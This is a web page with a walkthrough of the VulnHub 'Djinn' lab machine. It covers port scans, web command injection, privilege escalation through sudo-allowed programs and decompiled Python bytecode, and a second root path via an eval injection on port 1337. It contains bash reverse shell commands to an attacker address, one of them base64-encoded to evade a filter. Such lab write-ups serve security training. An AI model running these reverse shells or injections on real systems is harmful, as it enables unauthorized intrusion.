@@ -1,0 +1,273 @@
+---
+layout: default
+---
+<html>
+<head>
+    <title>Djinn Walkthrough</title>
+    <a href="https://pusher91.github.io/Hacking/">Return to Main Page</a>
+</head>
+
+<body>
+
+    <h1>Djinn Walkthrough</h1>
+
+    <hr>
+
+    <h2>Contents</h2>
+    <ul>
+        <li><a href="#summary">Summary</a></li>
+        <li><a href="#portscan">Port Scanning</a></li>
+        <li><a href="#infogather">Information Gathering</a></li>
+        <li><a href="#www-data">Shell - www-data</a></li>
+        <li><a href="#nitish">Shell - nitish</a></li>
+        <li><a href="#sam">Shell - sam</a></li>
+        <li><a href="#root">Shell Method #1 - root</a></li>
+        <li><a href="#root2">Shell Method #2 - root</a></li>
+    </ul>
+
+    <h2><a id="summary">Summary</a></h2>
+
+    <p>Djinn has two paths.  One path leads directly to root over port 1337.  This requires a python command injection of a base64 encoded reverse shell.  The shell returns as root.  The other path involves finding a web directory that allows us to execute commands.  Command execution filters for certain characters so we are forced to use a base64 encoded payload for our reverse shell.  This leads to the www-data low priv shell.  We find credentials in a file for the user nitish.  Once we switch to nitish we find that we have permissions to a sudo command.  The flag required to privesc using this sudo command is in the manual, it is not shown in the output from the -h help flag.  Using the sudo command we gain a shell as the user sam.  Sam also has a sudo ability that allows us to privesc to root.  Decompiling a file in Sam's home directory provides us with the information needed to exploit the sudo command in order to gain a root shell.</p>
+
+    <h2><a id="portscan">Port Scanning</a></h2>
+
+    <li>Running a port scan against the full port range to determine which ones are open.</li>
+
+    <pre>
+# Nmap 7.91 scan initiated Fri Sep 24 15:36:37 2021 as: nmap -p- -oN ping_tcp 10.0.0.20&#13;&#10;Nmap scan report for 10.0.0.20&#13;&#10;Host is up (0.0012s latency).&#13;&#10;Not shown: 65531 closed ports&#13;&#10;PORT     STATE    SERVICE&#13;&#10;21/tcp   open     ftp&#13;&#10;22/tcp   filtered ssh&#13;&#10;1337/tcp open     waste&#13;&#10;7331/tcp open     swx&#13;&#10;MAC Address: 00:0C:29:2C:20:02 (VMware)&#13;&#10;&#13;&#10;# Nmap done at Fri Sep 24 15:36:45 2021 -- 1 IP address (1 host up) scanned in 8.00 seconds
+    </pre>
+
+    <li>Running an nmap scan using the flags -sV and -sC to enumerate service versions and other information.</li>
+
+    <pre>
+# Nmap 7.91 scan initiated Fri Sep 24 15:37:12 2021 as: nmap -p21,1337,7331 -sV -sC -oN script_tcp 10.0.0.20&#13;&#10;Nmap scan report for 10.0.0.20&#13;&#10;Host is up (0.00019s latency).&#13;&#10;&#13;&#10;PORT     STATE SERVICE VERSION&#13;&#10;21/tcp   open  ftp     vsftpd 3.0.3&#13;&#10;| ftp-anon: Anonymous FTP login allowed (FTP code 230)&#13;&#10;| -rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt&#13;&#10;| -rw-r--r--    1 0        0             128 Oct 21  2019 game.txt&#13;&#10;|_-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt&#13;&#10;| ftp-syst: &#13;&#10;|   STAT: &#13;&#10;| FTP server status:&#13;&#10;|      Connected to ::ffff:10.0.0.1&#13;&#10;|      Logged in as ftp&#13;&#10;|      TYPE: ASCII&#13;&#10;|      No session bandwidth limit&#13;&#10;|      Session timeout in seconds is 300&#13;&#10;|      Control connection is plain text&#13;&#10;|      Data connections will be plain text&#13;&#10;|      At session startup, client count was 4&#13;&#10;|      vsFTPd 3.0.3 - secure, fast, stable&#13;&#10;|_End of status&#13;&#10;1337/tcp open  waste?&#13;&#10;| fingerprint-strings: &#13;&#10;|   NULL: &#13;&#10;|     ____ _____ _ &#13;&#10;|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ &#13;&#10;|     \x20/ _ \x20 | | | | &apos;_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/&#13;&#10;|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|&#13;&#10;|     Let&apos;s see how good you are with simple maths&#13;&#10;|     Answer my questions 1000 times and I&apos;ll give you your gift.&#13;&#10;|     &apos;/&apos;, 4)&#13;&#10;|   RPCCheck: &#13;&#10;|     ____ _____ _ &#13;&#10;|     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ &#13;&#10;|     \x20/ _ \x20 | | | | &apos;_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/&#13;&#10;|     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|&#13;&#10;|     Let&apos;s see how good you are with simple maths&#13;&#10;|     Answer my questions 1000 times and I&apos;ll give you your gift.&#13;&#10;|_    &apos;*&apos;, 2)&#13;&#10;7331/tcp open  http    Werkzeug httpd 0.16.0 (Python 2.7.15+)&#13;&#10;|_http-server-header: Werkzeug/0.16.0 Python/2.7.15+&#13;&#10;|_http-title: Lost in space&#13;&#10;1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :&#13;&#10;SF-Port1337-TCP:V=7.91%I=7%D=9/24%Time=614E28F5%P=x86_64-pc-linux-gnu%r(NU&#13;&#10;SF:LL,1BC,&quot;\x20\x20____\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2&#13;&#10;SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_____\x20_\x20\x20\x20\x20&#13;&#10;SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20/\x20___\|\x20__\&#13;&#10;SF:x20_\x20_\x20__\x20___\x20\x20\x20___\x20\x20\|_\x20\x20\x20_\(_\)_\x20&#13;&#10;SF:__\x20___\x20\x20\x20___\x20\n\|\x20\|\x20\x20_\x20/\x20_`\x20\|\x20&apos;_\&#13;&#10;SF:x20`\x20_\x20\\\x20/\x20_\x20\\\x20\x20\x20\|\x20\|\x20\|\x20\|\x20&apos;_\x&#13;&#10;SF:20`\x20_\x20\\\x20/\x20_\x20\\\n\|\x20\|_\|\x20\|\x20\(_\|\x20\|\x20\|\&#13;&#10;SF:x20\|\x20\|\x20\|\x20\|\x20\x20__/\x20\x20\x20\|\x20\|\x20\|\x20\|\x20\&#13;&#10;SF:|\x20\|\x20\|\x20\|\x20\|\x20\x20__/\n\x20\\____\|\\__,_\|_\|\x20\|_\|\&#13;&#10;SF:x20\|_\|\\___\|\x20\x20\x20\|_\|\x20\|_\|_\|\x20\|_\|\x20\|_\|\\___\|\n&#13;&#10;SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2&#13;&#10;SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x&#13;&#10;SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\&#13;&#10;SF:n\nLet&apos;s\x20see\x20how\x20good\x20you\x20are\x20with\x20simple\x20maths&#13;&#10;SF:\nAnswer\x20my\x20questions\x201000\x20times\x20and\x20I&apos;ll\x20give\x20&#13;&#10;SF:you\x20your\x20gift\.\n\(9,\x20&apos;/&apos;,\x204\)\n&gt;\x20&quot;)%r(RPCCheck,1BC,&quot;\x2&#13;&#10;SF:0\x20____\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x&#13;&#10;SF:20\x20\x20\x20\x20\x20\x20\x20\x20_____\x20_\x20\x20\x20\x20\x20\x20\x2&#13;&#10;SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20/\x20___\|\x20__\x20_\x20_\x&#13;&#10;SF:20__\x20___\x20\x20\x20___\x20\x20\|_\x20\x20\x20_\(_\)_\x20__\x20___\x&#13;&#10;SF:20\x20\x20___\x20\n\|\x20\|\x20\x20_\x20/\x20_`\x20\|\x20&apos;_\x20`\x20_\x&#13;&#10;SF:20\\\x20/\x20_\x20\\\x20\x20\x20\|\x20\|\x20\|\x20\|\x20&apos;_\x20`\x20_\x2&#13;&#10;SF:0\\\x20/\x20_\x20\\\n\|\x20\|_\|\x20\|\x20\(_\|\x20\|\x20\|\x20\|\x20\|&#13;&#10;SF:\x20\|\x20\|\x20\x20__/\x20\x20\x20\|\x20\|\x20\|\x20\|\x20\|\x20\|\x20&#13;&#10;SF:\|\x20\|\x20\|\x20\x20__/\n\x20\\____\|\\__,_\|_\|\x20\|_\|\x20\|_\|\\_&#13;&#10;SF:__\|\x20\x20\x20\|_\|\x20\|_\|_\|\x20\|_\|\x20\|_\|\\___\|\n\x20\x20\x2&#13;&#10;SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x&#13;&#10;SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\&#13;&#10;SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\nLet&apos;s\x2&#13;&#10;SF:0see\x20how\x20good\x20you\x20are\x20with\x20simple\x20maths\nAnswer\x2&#13;&#10;SF:0my\x20questions\x201000\x20times\x20and\x20I&apos;ll\x20give\x20you\x20your&#13;&#10;SF:\x20gift\.\n\(9,\x20&apos;\*&apos;,\x202\)\n&gt;\x20&quot;);&#13;&#10;MAC Address: 00:0C:29:2C:20:02 (VMware)&#13;&#10;Service Info: OS: Unix&#13;&#10;&#13;&#10;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&#13;&#10;# Nmap done at Fri Sep 24 15:38:47 2021 -- 1 IP address (1 host up) scanned in 95.17 seconds
+    </pre>
+
+    <br>
+    <h2><a id="infogather">Information Gathering</a></h2>
+
+    <li>The web server on port 7331 turns out to be the service of interest.  FTP contains a few files, accessible using anonymous login (anonymous:anonymous).  The files do not lead anything interesting.  We can connect to the service on port 1337 using netcat.  It is a math game.  This game on port 1337 is an alternative route to root which I will cover at the end.</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/Djinn/WebEnum]&#13;&#10;&boxur;&HorizontalLine;$ gobuster dir -u http://10.0.0.20:7331/ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt                     &#13;&#10;===============================================================&#13;&#10;Gobuster v3.1.0&#13;&#10;by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)&#13;&#10;===============================================================&#13;&#10;[+] Url:                     http://10.0.0.20:7331/&#13;&#10;[+] Method:                  GET&#13;&#10;[+] Threads:                 10&#13;&#10;[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt&#13;&#10;[+] Negative Status codes:   404&#13;&#10;[+] User Agent:              gobuster/3.1.0&#13;&#10;[+] Timeout:                 10s&#13;&#10;===============================================================&#13;&#10;2021/09/24 20:17:29 Starting gobuster in directory enumeration mode&#13;&#10;===============================================================&#13;&#10;/wish                 (Status: 200) [Size: 385]&#13;&#10;/genie                (Status: 200) [Size: 1676]&#13;&#10;                                                &#13;&#10;===============================================================&#13;&#10;2021/09/24 20:18:01 Finished&#13;&#10;===============================================================
+    </pre>
+
+    <li>Running gobuster against the web server reveals two directories.  The /wish directory leads us to a reverse shell.  On this page we are able to submit commands.  When we submit "whoami" we see www-data returns in the URL that we get redirected to.  So it appears we are getting command execution.  I did this in Burp as shown below.</li>
+
+    <img src="../images/djinn/injection_spot.png">
+
+    <li>However, when we submit other commands such as a reverse shell, "bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'", it returns with "Wrong+choice+of+words".  It looks like user input is being filtered so I use base64 encoding to get around this.  First I encoded the command with base64 and then I piped the base64 encoded command into bash to be executed.</li>
+    <ul>
+        <li>I test the base64 encoded reverse shell by connecting to my own machine.</li>
+        <img src="../images/djinn/base64_test.png">
+    </ul>
+
+    <br>
+    <h2><a id="www-data">Shell - www-data</a></h2>
+
+    <li>Now that I have verified the command works, I execute the command against the web server.  I also url-encode the command by highlighting the payload and pressing ctrl+u</li>
+
+    <img src="../images/djinn/rev_shell.png">
+
+    <br>
+    <br>
+
+    <li>After getting shell I take a look at the file /opt/80/app.py which is the directory that our shell starts in</li>
+    
+    <pre>
+        www-data@djinn:/opt$ cat 80/app.py&#13;&#10;        import subprocess&#13;&#10;        &#13;&#10;        from flask import Flask, redirect, render_template, request, url_for&#13;&#10;        &#13;&#10;        app = Flask(__name__)&#13;&#10;        app.secret_key = &quot;key&quot;&#13;&#10;        
+        <mark>CREDS = &quot;/home/nitish/.dev/creds.txt&quot;</mark>&#13;&#10;        &#13;&#10;        RCE = [&quot;/&quot;, &quot;.&quot;, &quot;?&quot;, &quot;*&quot;, &quot;^&quot;, &quot;$&quot;, &quot;eval&quot;, &quot;;&quot;]&#13;&#10;        &#13;&#10;        &#13;&#10;        def validate(cmd):&#13;&#10;            if CREDS in cmd and &quot;cat&quot; not in cmd:&#13;&#10;                return True&#13;&#10;        &#13;&#10;            try:&#13;&#10;                for i in RCE:&#13;&#10;                    for j in cmd:&#13;&#10;                        if i == j:&#13;&#10;                            return False&#13;&#10;                return True&#13;&#10;            except Exception:&#13;&#10;                return False&#13;&#10;        &#13;&#10;        &#13;&#10;        @app.route(&quot;/&quot;, methods=[&quot;GET&quot;])&#13;&#10;        def index():&#13;&#10;            return render_template(&quot;main.html&quot;)&#13;&#10;        &#13;&#10;        &#13;&#10;        @app.route(&quot;/wish&quot;, methods=[&apos;POST&apos;, &quot;GET&quot;])&#13;&#10;        def wish():&#13;&#10;            execute = request.form.get(&quot;cmd&quot;)&#13;&#10;            if execute:&#13;&#10;                if validate(execute):&#13;&#10;                    output = subprocess.Popen(execute, shell=True,&#13;&#10;                                              stdout=subprocess.PIPE).stdout.read()&#13;&#10;                else:&#13;&#10;                    output = &quot;Wrong choice of words&quot;&#13;&#10;        &#13;&#10;                return redirect(url_for(&quot;genie&quot;, name=output))&#13;&#10;            else:&#13;&#10;                return render_template(&apos;wish.html&apos;)&#13;&#10;        &#13;&#10;        &#13;&#10;        @app.route(&apos;/genie&apos;, methods=[&apos;GET&apos;, &apos;POST&apos;])&#13;&#10;        def genie():&#13;&#10;            if &apos;name&apos; in request.args:&#13;&#10;                page = request.args.get(&apos;name&apos;)&#13;&#10;            else:&#13;&#10;                page = &quot;It&apos;s not that hard&quot;&#13;&#10;        &#13;&#10;            return render_template(&apos;genie.html&apos;, file=page)&#13;&#10;        &#13;&#10;        &#13;&#10;        if __name__ == &quot;__main__&quot;:&#13;&#10;            app.run(host=&apos;0.0.0.0&apos;, debug=True)        
+    </pre>
+
+    <li>I highlighed the above code where the code specifies a file in the home directory of nitish named "creds.txt".  I take a look at this file and find credentials for the user nitish.</li>
+
+    <pre>
+www-data@djinn:/opt$ cat /home/nitish/.dev/creds.txt&#13;&#10;nitish:p4ssw0rdStr3r0n9
+    </pre>
+
+    <br>
+    <h2><a id="nitish">Shell - nitish</a></h2>
+
+    <li>I use the "su" command to switch to this user.</li>
+
+    <pre>
+www-data@djinn:/opt$ su nitish &#13;&#10;Password: &#13;&#10;nitish@djinn:/opt$ 
+    </pre>
+
+    <li>As the user nitish, I check "sudo -l" to see if nitish has any sudo permissions.</li>
+
+    <pre>
+nitish@djinn:~$ sudo -l&#13;&#10;Matching Defaults entries for nitish on djinn:&#13;&#10;    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin&#13;&#10;&#13;&#10;User nitish may run the following commands on djinn:&#13;&#10;    (sam) NOPASSWD: /usr/bin/genie
+    </pre>
+
+    <h2><a id="sam">Shell - sam</a></h2>
+
+    <li>nitish appears to have sudo permissions to run /usr/bin/genie as the user sam.  While investigating the program "genie" we find a few flags we can use.</li>
+
+    <pre>
+nitish@djinn:~$ sudo -u sam /usr/bin/genie -h&#13;&#10;usage: genie [-h] [-g] [-p SHELL] [-e EXEC] wish&#13;&#10;&#13;&#10;I know you&apos;ve came to me bearing wishes in mind. So go ahead make your wishes.&#13;&#10;&#13;&#10;positional arguments:&#13;&#10;  wish                  Enter your wish&#13;&#10;&#13;&#10;optional arguments:&#13;&#10;  -h, --help            show this help message and exit&#13;&#10;  -g, --god             pass the wish to god&#13;&#10;  -p SHELL, --shell SHELL&#13;&#10;                        Gives you shell&#13;&#10;  -e EXEC, --exec EXEC  execute command
+    </pre>
+
+    <li>However, after playing around with it a bit, I find that none of those flags help with anything.  The secret to privescing to Sam using /usr/bin/genie is in the manual for the program.</li>
+
+    <pre>&#13;&#10;man(8)                                                                genie man page                                                                man(8)&#13;&#10;&#13;&#10;NAME&#13;&#10;       genie - Make a wish&#13;&#10;&#13;&#10;SYNOPSIS&#13;&#10;       genie [-h] [-g] [-p SHELL] [-e EXEC] wish&#13;&#10;&#13;&#10;DESCRIPTION&#13;&#10;       genie would complete all your wishes, even the naughty ones.&#13;&#10;&#13;&#10;       We all dream of getting those crazy privelege escalations, this will even help you acheive that.&#13;&#10;&#13;&#10;OPTIONS&#13;&#10;       wish&#13;&#10;&#13;&#10;              This is the wish you want to make .&#13;&#10;&#13;&#10;       -g, --god&#13;&#10;&#13;&#10;              Sometime we all would like to make a wish to god, this option let you make wish directly to God;&#13;&#10;&#13;&#10;              Though genie can&apos;t gurantee you that your wish will be heard by God, he&apos;s a busy man you know;&#13;&#10;&#13;&#10;       -p, --shell&#13;&#10;&#13;&#10;              Well who doesn&apos;t love those. You can get shell. Ex: -p &quot;/bin/sh&quot;&#13;&#10;&#13;&#10;       -e, --exec&#13;&#10;&#13;&#10;              Execute command on someone else computer is just too damn fun, but this comes with some restrictions.&#13;&#10;&#13;&#10;       <mark>-cmd&#13;&#10;&#13;&#10;              You know sometime all you new is a damn CMD, windows I love you.</mark>&#13;&#10;&#13;&#10;SEE ALSO&#13;&#10;       mzfr.github.io&#13;&#10;&#13;&#10;BUGS&#13;&#10;       There are shit loads of bug in this program, it&apos;s all about finding one.&#13;&#10;&#13;&#10;AUTHOR&#13;&#10;       mzfr&#13;&#10;&#13;&#10;1.0                                                                  11 November 2019                                                               man(8)&#13;&#10; Manual page genie(8) line 12/47 (END) (press h for help or q to quit)&#13;&#10;    </pre>
+
+    <li>The manual page shows the "-cmd" flag which we were not previously made aware of.  Using this flag, we get a shell as sam.</li>
+
+    <pre>
+nitish@djinn:~$ sudo -u sam /usr/bin/genie -cmd anything&#13;&#10;my man!!&#13;&#10;$ id        &#13;&#10;uid=1000(sam) gid=1000(sam) groups=1000(sam),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare)&#13;&#10;$ python3 -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;);&quot;&#13;&#10;sam@djinn:~$ 
+    </pre>
+
+    <li>As sam I again, check "sudo -l" for any sudo permissions.</li>
+
+    <pre>
+sam@djinn:~$ sudo -l&#13;&#10;Matching Defaults entries for sam on djinn:&#13;&#10;    env_reset, mail_badpass,&#13;&#10;    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin&#13;&#10;&#13;&#10;User sam may run the following commands on djinn:&#13;&#10;    (root) NOPASSWD: /root/lago
+    </pre>
+
+    <h2><a id="root">Shell Method #1 - Root</a></h2>
+    
+    <li>Sam has sudo permissions to use the program /root/lago as root.  I investigate the program a bit.</li>
+
+    <pre>
+sam@djinn:~$ sudo /root/lago&#13;&#10;What do you want to do ?&#13;&#10;1 - Be naughty&#13;&#10;2 - Guess the number&#13;&#10;3 - Read some damn files&#13;&#10;4 - Work&#13;&#10;Enter your choice:
+    </pre>
+
+    <li>I am unable to make any progress exploiting the program at this point.  So I continue to look around for any clues as to how to use it.</li>
+
+
+    <br>
+
+    <li>There is a file named ".pyc" in Sam's home directory that looks like the source code behind /root/lago.  I initially use the command "strings" to examine the file contents.</li>
+
+    <pre>
+sam@djinn:/home/sam$ strings .pyc
+getuser(
+system(
+randintc
+Working on it!! (
+/home/mzfr/scripts/exp.pyt
+naughtyboi
+Choose a number between 1 to 100: s
+Enter your number: s
+/bin/shs
+Better Luck next time(
+inputR
+numt
+/home/mzfr/scripts/exp.pyt
+guessit
+Enter the full of the file to read: s!
+User %s is not allowed to read %s(
+usert
+path(
+/home/mzfr/scripts/exp.pyt	
+readfiles
+What do you want to do ?s
+1 - Be naughtys
+2 - Guess the numbers
+3 - Read some damn filess
+4 - Works
+Enter your choice: (
+intR
+choice(
+/home/mzfr/scripts/exp.pyt
+options
+work your ass off!!s"
+Do something better with your life(
+/home/mzfr/scripts/exp.pyt
+main'
+__main__N(
+getpassR
+randomR
+__name__(
+/home/mzfr/scripts/exp.pyt
+<module>
+    </pre>
+
+    <li>I can get a feel for how the program works based on the output from "strings" but I cannot full decipher how the program works or at least how to exploit it.  So I transfer the file to my Kali box for further examination.</li>
+    <ul>
+
+        <li>I created a web server</li>
+
+        <pre>
+sam@djinn:/home/sam$ python -m SimpleHTTPServer&#13;&#10;Serving HTTP on 0.0.0.0 port 8000 ...&#13;&#10;10.0.0.1 - - [25/Sep/2021 19:40:50] &quot;GET /.pyc HTTP/1.1&quot; 200 -
+        </pre>
+
+        <li>Then downloaded the file to Kali</li>
+        
+        <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/Djinn/exfiltrated]&#13;&#10;&boxur;&HorizontalLine;$ wget http://10.0.0.20:8000/.pyc                                                                                                                       4 &Cross;&#13;&#10;--2021-09-25 10:10:50--  http://10.0.0.20:8000/.pyc&#13;&#10;Connecting to 10.0.0.20:8000... connected.&#13;&#10;HTTP request sent, awaiting response... 200 OK&#13;&#10;Length: 1749 (1.7K) [application/octet-stream]&#13;&#10;Saving to: &OpenCurlyQuote;.pyc&rsquor;&#13;&#10;&#13;&#10;.pyc                                    100%[=============================================================================&gt;]   1.71K  --.-KB/s    in 0s      &#13;&#10;&#13;&#10;2021-09-25 10:10:50 (501 MB/s) - &OpenCurlyQuote;.pyc&rsquor; saved [1749/1749]  
+        </pre>
+
+    </ul>
+
+    <li>Now I decompile .pyc using uncompyle6</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(venv)&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/Djinn/exfiltrated]&#13;&#10;&boxur;&HorizontalLine;$ uncompyle6 .pyc&#13;&#10;# uncompyle6 version 2.13.3&#13;&#10;# Python bytecode 2.7 (62211)&#13;&#10;# Decompiled from: Python 2.7.18 (default, Jul 14 2021, 08:11:37) &#13;&#10;# [GCC 10.2.1 20210110]&#13;&#10;# Embedded file name: /home/mzfr/scripts/exp.py&#13;&#10;# Compiled at: 2019-11-07 08:05:18&#13;&#10;from getpass import getuser&#13;&#10;from os import system&#13;&#10;from random import randint&#13;&#10;&#13;&#10;def naughtyboi():&#13;&#10;    print &apos;Working on it!! &apos;&#13;&#10;&#13;&#10;&#13;&#10;def guessit():&#13;&#10;    num = randint(1, 101)&#13;&#10;    print &apos;Choose a number between 1 to 100: &apos;&#13;&#10;    s = input(&apos;Enter your number: &apos;)&#13;&#10;    if s == num:&#13;&#10;        system(&apos;/bin/sh&apos;)&#13;&#10;    else:&#13;&#10;        print &apos;Better Luck next time&apos;&#13;&#10;&#13;&#10;&#13;&#10;def readfiles():&#13;&#10;    user = getuser()&#13;&#10;    path = input(&apos;Enter the full of the file to read: &apos;)&#13;&#10;    print &apos;User %s is not allowed to read %s&apos; % (user, path)&#13;&#10;&#13;&#10;&#13;&#10;def options():&#13;&#10;    print &apos;What do you want to do ?&apos;&#13;&#10;    print &apos;1 - Be naughty&apos;&#13;&#10;    print &apos;2 - Guess the number&apos;&#13;&#10;    print &apos;3 - Read some damn files&apos;&#13;&#10;    print &apos;4 - Work&apos;&#13;&#10;    choice = int(input(&apos;Enter your choice: &apos;))&#13;&#10;    return choice&#13;&#10;&#13;&#10;&#13;&#10;def main(op):&#13;&#10;    if op == 1:&#13;&#10;        naughtyboi()&#13;&#10;    elif op == 2:&#13;&#10;        guessit()&#13;&#10;    elif op == 3:&#13;&#10;        readfiles()&#13;&#10;    elif op == 4:&#13;&#10;        print &apos;work your ass off!!&apos;&#13;&#10;    else:&#13;&#10;        print &apos;Do something better with your life&apos;&#13;&#10;&#13;&#10;&#13;&#10;if __name__ == &apos;__main__&apos;:&#13;&#10;    main(options())&#13;&#10;# okay decompiling .pyc
+    </pre>
+
+    <li>From the above code I can see that if I select option 2 for "Choose a number between 1 to 100:" and then enter "num" as my number, I should get a shell.</li>
+    
+    <pre>
+sam@djinn:/home/sam$ sudo /root/lago
+What do you want to do ?
+1 - Be naughty
+2 - Guess the number
+3 - Read some damn files
+4 - Work
+Enter your choice:2
+Choose a number between 1 to 100: 
+Enter your number: num
+# id
+uid=0(root) gid=0(root) groups=0(root)
+    </pre>
+    
+    <li>Root shell achieved.</li>
+
+    <br>
+    <h2><a id="root2">Shell Method #2 - Root</a></h2>
+
+    <li>The alternative route to root is through port 1337.  Port 1337 presents us with a math game</li>
+
+    <pre>
+┌──(kali㉿kali)-[~/Documents/VulnHub/Djinn]
+└─$ nc -nv 10.0.0.20 1337
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Connected to 10.0.0.20:1337.
+  ____                        _____ _                
+ / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___ 
+| |  _ / _` | '_ ` _ \ / _ \   | | | | '_ ` _ \ / _ \
+| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/
+ \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|
+                                                     
+
+Let's see how good you are with simple maths
+Answer my questions 1000 times and I'll give you your gift.
+(8, '/', 2)
+> 
+    </pre>
+
+    <li>We can test command injection by entering math commands</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/Djinn]&#13;&#10;&boxur;&HorizontalLine;$ nc -nv 10.0.0.20 1337                                                                                                                                                                                                                                                                                               130 &Cross;&#13;&#10;Ncat: Version 7.91 ( https://nmap.org/ncat )&#13;&#10;Ncat: Connected to 10.0.0.20:1337.&#13;&#10;  ____                        _____ _                &#13;&#10; / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___ &#13;&#10;| |  _ / _` | &apos;_ ` _ \ / _ \   | | | | &apos;_ ` _ \ / _ \&#13;&#10;| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/&#13;&#10; \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|&#13;&#10;                                                     &#13;&#10;&#13;&#10;Let&apos;s see how good you are with simple maths&#13;&#10;Answer my questions 1000 times and I&apos;ll give you your gift.&#13;&#10;(8, &apos;+&apos;, 9)&#13;&#10;&gt; 17&#13;&#10;(2, &apos;/&apos;, 1)&#13;&#10;&gt; 2/1&#13;&#10;(4, &apos;/&apos;, 5)&#13;&#10;&gt; 10&#13;&#10;Wrong answer
+    </pre>
+
+    <li>The program gives us a new problem when we answer the math problem correctly.  When I enter a math problem mirroring the one we are presented with, the program accepts it as a correct answer.  Therefore, it looks like the program is processing my input as a command.  Which leads me to believe we can inject some other malicious command.</li>
+    <ul>
+        <li>I use this to inject commands: eval(&apos;__import__(&quot;os&quot;).system(&quot;&lt;command&gt;&quot;)&apos;)</li>
+    </ul>
+    
+    <li>The program is filtering for certain characters such as "{".  If it detects on of those charcters the program tells us to stop acting like a hacker.  So I generate a base64 encoded reverse shell.</li>
+
+    <pre>
+&boxdr;&HorizontalLine;&HorizontalLine;(kali&#12927;kali)-[~/Documents/VulnHub/Djinn]&#13;&#10;&boxur;&HorizontalLine;$ echo -n &quot;bash -c &apos;bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1&apos;&quot; | base64                                                                                 130 &Cross;&#13;&#10;YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjEn
+    </pre>
+
+    <li>Then I inject it into the program and gain a root shell.</li>
+
+    <img src="../images/djinn/root_method2.png">
+
+</body>
+</html>
+
